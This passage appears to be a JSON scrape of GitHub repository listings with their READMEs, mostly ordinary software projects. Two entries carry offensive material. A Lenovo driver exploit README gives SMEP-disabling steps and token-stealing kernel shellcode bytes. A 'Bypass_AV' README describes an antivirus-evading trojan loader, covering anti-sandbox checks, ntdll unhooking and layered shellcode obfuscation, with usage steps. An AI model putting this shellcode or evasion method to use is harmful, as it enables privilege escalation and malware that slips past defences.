read our [Contributing Guide](CONTRIBUTING.md).\n\n## License\nBy contributing to Ladybug, you agree that your contributions will be licensed under the [MIT License](LICENSE).\n\n## Contact\nYou can contact us at [social@ladybugdb.com](mailto:social@ladybugdb.com) or [join our Discord community](https://discord.com/invite/hXyHmvW3Vy).\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-10-27T02:45:33.181990"
  },
  {
    "basic_info": {
      "name": "hint-break",
      "full_name": "sapdragon/hint-break",
      "owner": "sapdragon",
      "description": "Code proving a 25-year blind spot in all disassemblers. PoC for Intel x64/x86 “ghost instructions.”",
      "url": "https://github.com/sapdragon/hint-break",
      "clone_url": "https://github.com/sapdragon/hint-break.git",
      "ssh_url": "git@github.com:sapdragon/hint-break.git",
      "homepage": null,
      "created_at": "2025-10-02T03:52:04Z",
      "updated_at": "2025-10-26T19:05:57Z",
      "pushed_at": "2025-10-02T05:04:36Z"
    },
    "stats": {
      "stars": 103,
      "forks": 5,
      "watchers": 103,
      "open_issues": 1,
      "size": 745
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 431
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# 👻 Ghost in opcode\n\nThis repository contains the Proof-of-Concept and research for a 25-year-old architectural blind spot affecting modern reverse engineering tools.\n\n[![SAMPLE X86](https://raw.githubusercontent.com/sapdragon/hint-break/refs/heads/main/images/sample.png)](https://raw.githubusercontent.com/sapdragon/hint-break/refs/heads/main/images/sample.png)\n\n## The Blind Spot\n\nIn 1997, Intel patented (US5,701,442) a series of \"Hintable NOPs\". While most of these have been assigned functions or are correctly parsed, two opcodes — **`0F 1A`** and **`0F 1B`** — remain ghosts in the machine.\n\nCPUs execute these instructions as valid, multi-byte NOPs. However, leading disassemblers like **IDA Pro, Ghidra, and Binary Ninja** fail to recognize them. They interpret valid, executable code as unknown data, breaking static analysis and creating a simple but highly effective method for anti-disassembly.\n\nThis fundamental issue has remained largely unnoticed for decades.\n\n## How to Test\n\nYou can see the blind spot in action yourself in under a minute.\n\n1.  Grab the pre-compiled binary: `/samples/patched.exe`.\n2.  Open it in your favorite disassembler (IDA, Ghidra, etc.).\n3.  Navigate to the function.\n4.  Observe how the tool fails on the `0F 1A` and `0F 1B` opcodes, showing them as `db 0Fh, 1Ah...`, `undefined`, or `???`, effectively halting the analysis of the function.\n5.  Run `patched.exe`. It will execute flawlessly and print a success message, proving the instructions are valid.\n\n## Repository Structure\n\n-   `/src/`: The C++ source code used to generate the test binary.\n-   `/samples/`\n    -   `patched.exe`: The pre-compiled 64-bit PoC binary.\n-   `/papers/`:\n    -   `ru.pdf`: The full research paper (Russian).\n    -   `en.pdf`: The full research paper (English).\n\n## LICENSE\nMIT\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:34.308442"
  },
  {
    "basic_info": {
      "name": "perf-portfolio",
      "full_name": "ashtonsix/perf-portfolio",
      "owner": "ashtonsix",
      "description": "HPC research and demonstrations",
      "url": "https://github.com/ashtonsix/perf-portfolio",
      "clone_url": "https://github.com/ashtonsix/perf-portfolio.git",
      "ssh_url": "git@github.com:ashtonsix/perf-portfolio.git",
      "homepage": null,
      "created_at": "2025-10-04T13:03:51Z",
      "updated_at": "2025-10-24T11:19:23Z",
      "pushed_at": "2025-10-24T11:19:20Z"
    },
    "stats": {
      "stars": 103,
      "forks": 5,
      "watchers": 103,
      "open_issues": 0,
      "size": 45537
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 182563,
        "C": 19716,
        "Python": 10007,
        "Makefile": 3638,
        "Awk": 3062
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# Ashton Six: Performance Portfolio\n\n10+ years experience in software engineering, now specialising in HPC.\n\n## Projects\n\n1. **[NEON Bytepack](./bytepack/README.md)** — bit pack/unpack routines; ~1.9× GB/s vs SOTA plane-transpose baseline.\n1. **[NEON Delta Coding](./delta/README.md)** — delta, delta-of-delta and xor-with-previous decoding; ~1.5–2.2x GB/s vs baseline.\n1. **[BSPX](./bspx/README.ipynb)** — bitset compression scheme with strong performance potential, 46% size reduction vs Roaring+RLE.\n1. More releasing soon.\n\n## Contact\n\nAvailable for hire: https://ashtonsix.com\n\nFollow me on X [@ashtonsix](https://x.com/ashtonsix) and LinkedIn [in/ashtonsix](https://linkedin.com/in/ashtonsix).\n\n## Development Environment\n\nLaunch a fresh `m8g.large` instance on AWS (Neoverse V2, Graviton4) with Ubuntu LTS, connect via VSCode, and run this setup:\n\n```sh\n# Basics\nsudo apt update\nsudo apt install -y curl gnupg lsb-release make gawk build-essential\n\n# LLVM toolchain (v21 pinned)\ncodename=\"$(lsb_release -cs)\"\nsudo mkdir -p /etc/apt/keyrings\ncurl -fsSL https://apt.llvm.org/llvm-snapshot.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/llvm.gpg\necho \"deb [signed-by=/etc/apt/keyrings/llvm.gpg] http://apt.llvm.org/$codename/ llvm-toolchain-$codename-21 main\" | \\\n  sudo tee /etc/apt/sources.list.d/llvm-21.list >/dev/null\nsudo apt update\nsudo apt install -y clang-21 lld-21 llvm-21-tools\nsudo ln -sf /usr/bin/ld.lld-21 /usr/bin/ld.lld\n\n# SIMDe (SIMD Everywhere)\ngit clone --depth 1 https://github.com/simd-everywhere/simde /tmp/simde\nsudo rm -rf /usr/local/include/simde\nsudo mkdir -p /usr/local/include\nsudo cp -R /tmp/simde/simde /usr/local/include/\n\n# Source\ngit clone --depth 1 https://github.com/ashtonsix/perf-portfolio.git\n```\n\n## License\n\nApache 2.0\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:35.411527"
  },
  {
    "basic_info": {
      "name": "-CRYENGINE-Community-Edition-",
      "full_name": "Pterosoft/-CRYENGINE-Community-Edition-",
      "owner": "Pterosoft",
      "description": "CRYENGINE Community Edition - Release Version",
      "url": "https://github.com/Pterosoft/-CRYENGINE-Community-Edition-",
      "clone_url": "https://github.com/Pterosoft/-CRYENGINE-Community-Edition-.git",
      "ssh_url": "git@github.com:Pterosoft/-CRYENGINE-Community-Edition-.git",
      "homepage": null,
      "created_at": "2025-10-02T12:24:22Z",
      "updated_at": "2025-10-26T04:47:54Z",
      "pushed_at": "2025-10-20T19:51:58Z"
    },
    "stats": {
      "stars": 102,
      "forks": 10,
      "watchers": 102,
      "open_issues": 0,
      "size": 431647
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 2007468,
        "Rich Text Format": 127244,
        "HLSL": 17268,
        "CMake": 16372,
        "C": 3059,
        "Python": 221
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# CRYENGINE Community Edition\nCRYENGINE Community Edition is a new features and improvements developed and maintained by the community. It builds on the foundation of CRYENGINE while introducing new features, improvements, and customization options contributed by developers in their free time.\n## Installation\n- Download the source code for CRYENGINE 5.7\n- After you get cryengine 5.7.1 source code, \n- Download  CRYENGINE_V5.7.0_SDKs.zip  manually,  Extract it to EngineRootFolder/Code/SDKs. then  replace the patch files.\n- place empty zip file near cry_cmake.exe and rename it to CRYENGINE_V5.7.0_SDKs.zip.\n- run cmake (or cry_cmake.exe) and generate solutions. \n\nWhy this step required for cry_cmake.exe( it's a known bug) :\nSometimes cry_cmake.exe can't download SDKs properly and tries to extract broken sdks archive file. By the way Archive is broken and cry_cmake.exe don't know About it and continues the operation.\n\n# Fix:\n- download the CRYENGINE_V5.7.0_SDKs.zip manually, extract to engine root folder/code/sdks\n- place empty zip file near cry_cmake.exe and rename it to CRYENGINE_V5.7.0_SDKs.zip. Cry_cmake.exe assumes sdks was downloaded and skips download step and saves your time and also it  reduces broken download risk. Then run cry_cmake.exe and generate solutions.\n\n## License&nbsp;\nAll files provided here are licensed under the MIT License, meaning you are free to use them in your own projects at no cost.The engine itself remains under the CRYENGINE license provided by Crytek. You must comply with the terms of that license when using the engine.Before downloading or using these files, please review the official CRYENGINE license on the CRYENGINE website&nbsp;to ensure you fully understand the requirements.Thank you for respecting both licenses and supporting the community effort.\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:36.544331"
  },
  {
    "basic_info": {
      "name": "Lenovo-CVE-2025-8061",
      "full_name": "symeonp/Lenovo-CVE-2025-8061",
      "owner": "symeonp",
      "description": "PoC for popping a system shell against the LnvMSRIO.sys driver",
      "url": "https://github.com/symeonp/Lenovo-CVE-2025-8061",
      "clone_url": "https://github.com/symeonp/Lenovo-CVE-2025-8061.git",
      "ssh_url": "git@github.com:symeonp/Lenovo-CVE-2025-8061.git",
      "homepage": null,
      "created_at": "2025-10-06T09:33:59Z",
      "updated_at": "2025-10-26T20:46:35Z",
      "pushed_at": "2025-10-06T10:54:28Z"
    },
    "stats": {
      "stars": 98,
      "forks": 7,
      "watchers": 98,
      "open_issues": 0,
      "size": 974
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 12123,
        "Assembly": 1226,
        "C": 13
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "![System shell.](lenovo-sys.png)\n\n\n# Lenovo-CVE-2025-8061\nPoC for popping a system shell against the LnvMSRIO.sys (3.1.0.36) driver.\n All credits go to the original author [Luis Casvella from Quarkslab](https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061.html).\n This works against latest Windows 11 Version 24H2 (with KVAShadowing and Core Isolation disabled!)\n\n> [!NOTE]\n> This was compiled using latest Visual Studio 22.\n\n## Useful notes for exploitation\n\n> [!CAUTION]\n> The offsets for this exploit are hardcoded for Windows version: Edition build lab: 26100.1.amd64fre.ge_release.240331-1435.\n> As such you *need* to modify/debug your system since they will be different than the ones I've used for this.\n\nThe `KiSystemCall64` offset was obviously different to the author's one:\n\n`#define FUNCTION_OFFSET__KISYSTEMCALL64     0x6b2b40  // nt!KiSystemCall64 offset`\n\n```\n0: kd> rdmsr c0000082\nmsr[c0000082] = fffff801`e76b2b40\n0: kd> ? fffff801`e76b2b40 - nt\nEvaluate expression: 7023424 = 00000000`006b2b40\n```\n\n## Disabling SMEP\n\nThe current value of the `cr4` register for my system was `0x00350EF8`\nAs such in order to disable SMEP you need the bit 20 *cleared*:\n\n```\n0x350ef8 = 0011 0101 0000 1110 1111 1000\nBit 20 (SMEP) = 1 (enabled)\n```\n\nSo to find out the correct value:\n`0x350ef8 & ~0x100000 = 0x250ef8`\n\nVerify Your System's CR4\nFirst check what CR4 value your system should have:\n```r cr4\n? cr4 & 0x100000   ; Check if bit 20 is set\n```\n\nVery important in the return to user mode shellcoding section make sure you restore it to its *original* value!\n\n## ASLR Bypass.\n\nUsing a different machine:\n\n```\n6: kd> r cr4\ncr4=0000000000370678\n6: kd> rdmsr C0000082\nmsr[c0000082] = fffff803`88d7a200\n6: kd> u fffff803`88d7a200\nnt!KiSystemCall64Shadow:\nfffff803`88d7a200 0f01f8          swapgs\nfffff803`88d7a203 654889242510b00000 mov   qword ptr gs:[0B010h],rsp\nfffff803`88d7a20c 65488b242500b00000 mov   rsp,qword ptr gs:[0B000h]\n--snip--\n6: kd> ? fffff803`88d7a200 - nt\nEvaluate expression: 12034560 = 00000000`00b7a200\n```\nAs you can see these are all different and technically there's no ASLR bypass here (meh)..\nTechniques to research:\n\n```\n1. Signature Scanning \nOnce you have KiSystemCall64Shadow address from LSTAR, scan backwards or forwards for known byte patterns that are stable across versions. For example:\n\n// KiSystemCall64Shadow always starts with: swapgs (0f 01 f8)\n// Verify you have the right address\nif (memcmp(leaked_address, \"\\x0f\\x01\\xf8\", 3) != 0) {\n    // Invalid - adjust offset\n}\n\n// Then scan for other gadgets relative to this known point\n// For example, find \"pop rcx; ret\" pattern: 59 c3\n\n2. Use Known Offsets Between Functions\nSome offsets between kernel functions are more stable. Once you have KiSystemCall64Shadow:\n\n// KiSystemCall64 is usually nearby (a few KB away)\n// Scan the region for the standard KiSystemCall64 prologue\n// Search for: 0f 01 f8 65 48 89 24 25 (swapgs + mov gs:[...], rsp)\n```\n\n## Token stealing shellcode.\nSince again am using a different version I had to slightly modify that shellcode:\n\n```\n    unsigned char tokenSteal[] = {\n        0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  // mov rax, gs:[0x188]\n        0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,              // mov rax, [rax+0x220] <- Changed from 0xb8\n        0x49, 0x89, 0xC0,                                       // mov r8, rax\n        0x4D, 0x8B, 0x80, 0xD8, 0x01, 0x00, 0x00,              // mov r8, [r8+0x1d8]\n        0x49, 0x81, 0xE8, 0xD8, 0x01, 0x00, 0x00,              // sub r8, 0x1d8\n        0x4D, 0x8B, 0x88, 0xD0, 0x01, 0x00, 0x00,              // mov r9, [r8+0x1d0]\n        0x49, 0x83, 0xF9, 0x04,                                 // cmp r9, 4\n        0x75, 0xE5,                                             // jne (loop back)\n        0x49, 0x8B, 0x88, 0x48, 0x02, 0x00, 0x00,              // mov rcx, [r8+0x248]\n        0x80, 0xE1, 0xF0,                                       // and cl, 0xf0\n        0x48, 0x89, 0x88, 0x48, 0x02, 0x00, 0x00               // mov [rax+0x248], rcx\n    };\n```\n\nFor these you need to check the following structures and adjust:\n```\n0: kd> dt nt!_KPCR\n   +0x000 NtTib            : _NT_TIB\n   +0x000 GdtBase          : Ptr64 _KGDTENTRY64\n   +0x008 TssBase          : Ptr64 _KTSS64\n   +0x010 UserRsp          : Uint8B\n   +0x018 Self             : Ptr64 _KPCR\n   +0x020 CurrentPrcb      : Ptr64 _KPRCB\n   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE\n   +0x030 Used_Self        : Ptr64 Void\n   +0x038 IdtBase          : Ptr64 _KIDTENTRY64\n   +0x040 Unused           : [2] Uint8B\n   +0x050 Irql             : UChar\n   +0x051 SecondLevelCacheAssociativity : UChar\n   +0x052 ObsoleteNumber   : UChar\n   +0x053 Fill0            : UChar\n   +0x054 Unused0          : [3] Uint4B\n   +0x060 MajorVersion     : Uint2B\n   +0x062 MinorVersion     : Uint2B\n   +0x064 StallScaleFactor : Uint4B\n   +0x068 Unused1          : [3] Ptr64 Void\n   +0x080 KernelReserved   : [15] Uint4B\n   +0x0bc SecondLevelCacheSize : Uint4B\n   ",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:37.679765"
  },
  {
    "basic_info": {
      "name": "Bypass_AV",
      "full_name": "hkl1x/Bypass_AV",
      "owner": "hkl1x",
      "description": "免杀木马样本",
      "url": "https://github.com/hkl1x/Bypass_AV",
      "clone_url": "https://github.com/hkl1x/Bypass_AV.git",
      "ssh_url": "git@github.com:hkl1x/Bypass_AV.git",
      "homepage": "",
      "created_at": "2025-10-02T08:21:29Z",
      "updated_at": "2025-10-24T19:24:35Z",
      "pushed_at": "2025-10-11T10:05:48Z"
    },
    "stats": {
      "stars": 95,
      "forks": 13,
      "watchers": 95,
      "open_issues": 1,
      "size": 367
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 40064
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# 这是一个能绕过绝大部分杀软、沙箱的木马样本\n下面我会对木马所涉及的技术进行阐述我会针对shellcode和加载器两方面解释\n## 加载器部分\n### 1.反沙箱 \n#### 众说周知反沙箱的检测常规就是针对主机的cpu、内存、硬盘等操作，但是我个人认为这样不妥因为一些杀软或云沙箱会检测反沙箱功能，会对一些敏感api进行监控从而被抓包，所以我的思路是对桌面的快捷方式检测比如qq、微信、钉钉这些常规使用的软件进行检测逃避云沙箱。\n<img width=\"1918\" height=\"990\" alt=\"vt\" src=\"https://github.com/user-attachments/assets/f6c4d58e-374d-428f-bf0b-73c3ef8233e8\" />\n\n###  2.ntdll的重载和api的动态调用\n\n####  一般杀软的检测机制就是会对一些敏感的api上钩子那么我们通过ntdll的重载和api的动态调用技术就可以绕过钩子实现功能，ntdll重载这一块是从系统目录加载原始 ntdll.dll，将当前进程中被挂钩的 ntdll 代码段（.text 段）替换为原始代码，api动态调用是遍历目标dll的导出表使用hash匹配函数名获取目标函数的地址使用指针执行。\n\n### 3.shellcode和加载器分离\n#### shellcode除了编码绕过杀软还可以和加载器分离，就是shellcode都不在exe里杀软就挺难检测出问题。\n\n## shellcode部分\n### shellcode部分主要多层混淆处理 使用的是XOR+RC4+base64+mac多层处理，最后是mac地址格式存在是windows对mac格式字符串有一定的宽容性。 \n\n## 使用方法\n### 先使用encode.cpp对shellcode进行加密，如果把shellcode写道exe里请在Unseparation_shellcode.cpp的mac_shellcode数组里。如果想实现参数分离可以使用我编译好的exe+shellcode运行即可\n\n#### 感谢阅读\n\n\n\n### English version\n\n\n\nThis is a Trojan sample that can bypass the vast majority of antivirus software and sandboxes. Below, I will explain the technologies involved in the Trojan, focusing on both the shellcode and the loader.\n\n## Loader Section\n### 1. Anti-sandbox\nIt is well-known that the conventional detection of anti-sandbox functions is based on operations on the host's CPU, memory, hard disk, etc. However, I personally think this approach is not ideal because some antivirus software or cloud sandboxes will monitor anti-sandbox functions and keep an eye on sensitive APIs, which may lead to detection. Therefore, my idea is to detect desktop shortcuts, such as those for commonly used software like QQ, WeChat, and DingTalk, to evade cloud sandboxes. <img width=\"1918\" height=\"990\" alt=\"vt\" src=\"https://github.com/user-attachments/assets/f6c4d58e-374d-428f-bf0b-73c3ef8233e8\" />\n\n\n### 2. Overloading of ntdll and Dynamic Invocation of APIs \n\nThe detection mechanism of general anti-virus software is to hook some sensitive APIs. Therefore, we can bypass the hooks and achieve the function by using the ntdll overloading and dynamic API calling techniques. The ntdll overloading part involves loading the original ntdll.dll from the system directory and replacing the hooked ntdll code segment (.text segment) in the current process with the original code. The dynamic API calling is to traverse the export table of the target dll, match the function name using hash, obtain the address of the target function, and execute it using a pointer. \n\n### 3. Separation of Shellcode and Loader\n#### Besides encoding to bypass antivirus software, shellcode can also be separated from the loader. If the shellcode is not included in the exe file, it becomes quite difficult for antivirus software to detect any issues. \n\nThe shellcode section mainly undergoes multi-layer obfuscation processing, which involves XOR, RC4, base64, and MAC. The final output is in MAC address format, taking advantage of Windows' tolerance for MAC format strings. \n\n## Usage Method\n### First, use encode.cpp to encrypt the shellcode. If you write the shellcode into an exe file, please place it in the mac_shellcode array in Unseparation_shellcode.cpp. If you want to achieve parameter separation, you can run the compiled exe + shellcode directly. \n\nThank you for reading.\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:38.846753"
  },
  {
    "basic_info": {
      "name": "Quant-Enthusiasts-Risk-Engine",
      "full_name": "Quant-Enthusiasts/Quant-Enthusiasts-Risk-Engine",
      "owner": "Quant-Enthusiasts",
      "description": "The Robust Risk Engine of the Quant Enthusiasts Community",
      "url": "https://github.com/Quant-Enthusiasts/Quant-Enthusiasts-Risk-Engine",
      "clone_url": "https://github.com/Quant-Enthusiasts/Quant-Enthusiasts-Risk-Engine.git",
      "ssh_url": "git@github.com:Quant-Enthusiasts/Quant-Enthusiasts-Risk-Engine.git",
      "homepage": "",
      "created_at": "2025-10-18T17:44:44Z",
      "updated_at": "2025-10-27T01:42:10Z",
      "pushed_at": "2025-10-26T10:57:13Z"
    },
    "stats": {
      "stars": 93,
      "forks": 37,
      "watchers": 93,
      "open_issues": 12,
      "size": 4351
    },
    "tech_info": {
      "language": "C++",
      "languages": {
        "C++": 128791,
        "Python": 75104,
        "HTML": 42443,
        "CMake": 4828,
        "Shell": 3410,
        "Dockerfile": 1656
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# Quant Enthusiasts Risk Engine\r\n\r\nA high-performance quantitative finance platform for portfolio risk management and options pricing. Built with C++17 core, Python bindings, and an interactive web dashboard.\r\n\r\n[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)\r\n[![C++17](https://img.shields.io/badge/C++-17-00599C?logo=cplusplus)](https://isocpp.org/)\r\n[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)](https://www.python.org/)\r\n\r\n## Overview\r\n\r\nCross-language quantitative finance platform offering:\r\n\r\n- **Multiple Pricing Models**: Black-Scholes, Binomial Tree, Merton Jump Diffusion\r\n- **Risk Analytics**: Greeks calculation, Value at Risk (Monte Carlo), Portfolio aggregation\r\n- **Live Market Data**: Automatic fetching from Yahoo Finance with caching\r\n- **RESTful API**: Flask-based endpoints with comprehensive validation\r\n- **Web Dashboard**: Interactive portfolio builder and risk visualizer\r\n\r\n## Quick Start\r\n\r\n```bash\r\n# Clone repository\r\ngit clone https://github.com/Quant-Enthusiasts/Quant-Enthusiasts-Risk-Engine.git\r\ncd Quant-Enthusiasts-Risk-Engine\r\n\r\n# Build C++ engine\r\ncd cpp_engine\r\nmkdir build && cd build\r\ncmake .. -GNinja -DCMAKE_BUILD_TYPE=Release\r\ncmake --build .\r\ncmake --install .\r\n\r\n# Setup Python API\r\ncd ../../python_api\r\npython3 -m venv venv\r\nsource venv/bin/activate\r\npip install -r requirements.txt\r\npython setup.py build_ext --inplace\r\n\r\n# Start API server\r\npython app.py\r\n```\r\n\r\nServer runs at `http://127.0.0.1:5000`\r\n\r\nFor detailed setup instructions, see [INSTALLATION.md](INSTALLATION.md).\r\n\r\n## Architecture\r\n\r\n```\r\nJavaScript Dashboard (Frontend)\r\n         |\r\n         | HTTP/JSON\r\n         v\r\n  Python API Layer (Flask)\r\n         |\r\n         | pybind11\r\n         v\r\n   C++ Risk Engine (Core)\r\n```\r\n\r\n**Project Structure:**\r\n```\r\nQuant-Enthusiasts-Risk-Engine/\r\n├── cpp_engine/          # C++ core with pricing models\r\n├── python_api/          # Flask API + Python bindings\r\n├── js_dashboard/        # Web interface\r\n└── docs/                # Additional documentation\r\n```\r\n\r\n## Core Features\r\n\r\n### Pricing Models\r\n\r\n| Model | Type | Options | Key Features |\r\n|-------|------|---------|--------------|\r\n| Black-Scholes | Analytical | European | Fast, Greeks calculation |\r\n| Binomial Tree | Numerical | European/American | Early exercise, configurable steps |\r\n| Merton Jump Diffusion | Analytical | European | Discontinuous jumps |\r\n\r\n### Risk Metrics\r\n\r\n- **Greeks**: Delta, Gamma, Vega, Theta, Rho\r\n- **VaR**: Monte Carlo simulation (configurable paths)\r\n- **Expected Shortfall**: 95%/99% confidence levels\r\n- **Portfolio Analytics**: Net positions, PV aggregation\r\n\r\n### Market Data Integration\r\n\r\n- Automatic fetching from Yahoo Finance\r\n- SQLite-based caching (24-hour expiration)\r\n- Bulk ticker updates\r\n- Volatility calculation from historical data\r\n\r\nSee [MARKET_DATA.md](MARKET_DATA.md) for details.\r\n\r\n## Usage Example\r\n\r\n```bash\r\n# Fetch market data\r\ncurl -X POST http://127.0.0.1:5000/update_market_data \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"tickers\": [\"AAPL\", \"GOOGL\"]}'\r\n\r\n# Calculate portfolio risk (auto-fetches missing data)\r\ncurl -X POST http://127.0.0.1:5000/calculate_risk \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\r\n    \"portfolio\": [\r\n      {\r\n        \"type\": \"call\",\r\n        \"strike\": 180,\r\n        \"expiry\": 1.0,\r\n        \"asset_id\": \"AAPL\",\r\n        \"quantity\": 100,\r\n        \"style\": \"european\"\r\n      }\r\n    ],\r\n    \"market_data\": {}\r\n  }'\r\n```\r\n\r\nFull API documentation: [API.md](API.md)\r\n\r\n## Performance\r\n\r\n| Operation | Latency | Notes |\r\n|-----------|---------|-------|\r\n| Single option pricing | < 1 microsecond | Black-Scholes |\r\n| Portfolio (100 options) | < 1 ms | Full Greeks |\r\n| VaR (100K simulations) | < 1 s | 95% confidence |\r\n\r\n## Documentation\r\n\r\n- [Installation Guide](INSTALLATION.md) - Detailed setup for all platforms\r\n- [API Reference](API.md) - Complete endpoint documentation\r\n- [Development Guide](DEVELOPMENT.md) - Testing, contributing, CI/CD\r\n- [Market Data Guide](MARKET_DATA.md) - YFinance integration details\r\n- [Deployment Guide](DEPLOYMENT.md) - Docker, production setup\r\n\r\n## Contributing\r\n\r\nWe welcome contributions! Please see [DEVELOPMENT.md](DEVELOPMENT.md) for:\r\n\r\n- Development setup\r\n- Code style guidelines\r\n- Testing requirements\r\n- Pull request process\r\n\r\n## Support\r\n\r\n- **GitHub Issues**: [Report bugs or request features](https://github.com/Quant-Enthusiasts/Quant-Enthusiasts-Risk-Engine/issues)\r\n- **Discord**: [Join our community](https://discord.com/invite/z3S9Fguzw3)\r\n\r\n## License\r\n\r\nThis project is licensed under the MIT License. See [LICENSE](LICENSE) for details.\r\n\r\n---\r\n\r\n**Made by Quant Enthusiasts** | [Documentation](docs/) | [GitHub](https://github.com/Quant-Enthusiasts)\r\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-10-27T02:45:39.953298"
  }
]